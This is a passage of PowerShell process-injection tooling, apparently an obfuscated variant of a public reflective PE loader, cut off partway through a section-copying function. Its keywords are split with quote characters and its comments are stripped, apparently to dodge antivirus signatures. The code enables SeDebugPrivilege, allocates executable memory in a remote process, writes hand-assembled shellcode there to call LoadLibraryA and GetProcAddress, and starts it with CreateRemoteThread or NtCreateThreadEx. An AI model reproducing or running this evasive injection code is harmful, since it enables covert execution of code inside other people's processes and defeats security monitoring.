		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32F'u'N'c'T'i'O'n's.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32F'u'N'c'T'i'O'n's.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() ## comment ; ##
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			## comment ; ##
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	F'u'N'c'T'i'O'n' Invoke-CreateRemoteThread
	{
		Param(
		[NotANumber(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[NotANumber(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[NotANumber(Position = 3, Mandatory = $false)]
		[IntPtr]
		$NotTodayPal = [IntPtr]::Zero,
		
		[NotANumber(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32F'u'N'c'T'i'O'n's
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		## comment ; ##
		if (($OSVersion -ge (N'e'W'-'o'B'j'E'c'T' 'Version' 6,0)) -and ($OSVersion -lt (N'e'W'-'o'B'j'E'c'T' 'Version' 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32F'u'N'c'T'i'O'n's.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $NotTodayPal, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		## comment ; ##
		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32F'u'N'c'T'i'O'n's.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $NotTodayPal, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Verbose "Error creating remote thread, thread handle is null"
		}
		
		return $RemoteThreadHandle
	}

	

	F'u'N'c'T'i'O'n' Get-ImageNtHeaders
	{
		Param(
		[NotANumber(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[NotANumber(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = N'e'W'-'o'B'j'E'c'T' System.Object
		
		## comment ; ##
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		## comment ; ##
		[IntPtr]$NtHeadersPtr = [IntPtr](A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		## comment ; ##
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	## comment ; ##
	F'u'N'c'T'i'O'n' Get-PEBasicInfo
	{
		Param(
		[NotANumber( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[NotANumber(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = N'e'W'-'o'B'j'E'c'T' System.Object
		
		## comment ; ##
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		## comment ; ##
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		## comment ; ##
		$PEInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		## comment ; ##
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	## comment ; ##
	## comment ; ##
	F'u'N'c'T'i'O'n' Get-PEDetailedInfo
	{
		Param(
		[NotANumber( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[NotANumber(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[NotANumber(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = N'e'W'-'o'B'j'E'c'T' System.Object
		
		## comment ; ##
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		## comment ; ##
		$PEInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	F'u'N'c'T'i'O'n' Import-DllInRemoteProcess
	{
		Param(
		[NotANumber(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[NotANumber(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32F'u'N'c'T'i'O'n's.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32F'u'N'c'T'i'O'n's.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32F'u'N'c'T'i'O'n's.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32F'u'N'c'T'i'O'n's.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") ## comment ; ##
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		## comment ; ##
		## comment ; ##
		if ($PEInfo.PE64Bit -eq $true)
		{
			## comment ; ##
			$LoadLibraryARetMem = $Win32F'u'N'c'T'i'O'n's.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			## comment ; ##
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($PtrSize)
			w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($PtrSize)
			w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($PtrSize)
			w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32F'u'N'c'T'i'O'n's.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32F'u'N'c'T'i'O'n's.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32F'u'N'c'T'i'O'n's $Win32F'u'N'c'T'i'O'n's
			$Result = $Win32F'u'N'c'T'i'O'n's.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			## comment ; ##
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32F'u'N'c'T'i'O'n's.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32F'u'N'c'T'i'O'n's.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32F'u'N'c'T'i'O'n's.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -NotTodayPal $RImportDllPathPtr -Win32F'u'N'c'T'i'O'n's $Win32F'u'N'c'T'i'O'n's
			$Result = $Win32F'u'N'c'T'i'O'n's.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32F'u'N'c'T'i'O'n's.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32F'u'N'c'T'i'O'n's.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	F'u'N'c'T'i'O'n' Get-RemoteProcAddress
	{
		Param(
		[NotANumber(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[NotANumber(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[NotANumber(Position=2, Mandatory=$true)]
		[String]
		$F'u'N'c'T'i'O'n'Name
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$F'u'N'c'T'i'O'n'NamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($F'u'N'c'T'i'O'n'Name)
		
		## comment ; ##
		$F'u'N'c'T'i'O'n'NameSize = [UIntPtr][UInt64]([UInt64]$F'u'N'c'T'i'O'n'Name.Length + 1)
		$RFuncNamePtr = $Win32F'u'N'c'T'i'O'n's.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $F'u'N'c'T'i'O'n'NameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RFuncNamePtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32F'u'N'c'T'i'O'n's.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $F'u'N'c'T'i'O'n'NamePtr, $F'u'N'c'T'i'O'n'NameSize, [Ref]$NumBytesWritten)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($F'u'N'c'T'i'O'n'NamePtr)
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($F'u'N'c'T'i'O'n'NameSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		## comment ; ##
		$Kernel32Handle = $Win32F'u'N'c'T'i'O'n's.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32F'u'N'c'T'i'O'n's.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") ## comment ; ##

		
		## comment ; ##
		$GetProcAddressRetMem = $Win32F'u'N'c'T'i'O'n's.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		## comment ; ##
		## comment ; ##
		## comment ; ##
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($PtrSize)
		w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($PtrSize)
		w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($PtrSize)
		w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($PtrSize)
		w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32F'u'N'c'T'i'O'n's.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$Success = $Win32F'u'N'c'T'i'O'n's.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32F'u'N'c'T'i'O'n's $Win32F'u'N'c'T'i'O'n's
		$Result = $Win32F'u'N'c'T'i'O'n's.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		## comment ; ##
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32F'u'N'c'T'i'O'n's.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

		$Win32F'u'N'c'T'i'O'n's.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32F'u'N'c'T'i'O'n's.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32F'u'N'c'T'i'O'n's.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $ProcAddress
	}


	F'u'N'c'T'i'O'n' Copy-Sections
	{
		Param(
		[NotANumber(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[NotANumber(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[NotANumber(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32F'u'N'c'T'i'O'n's,
		
		[NotANumber(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			## comment ; ##
			[IntPtr]$SectionDestAddr = [IntPtr](A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			## comment ; ##
			## comment ; ##
			## comment ; ##
			## comment ; ##
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
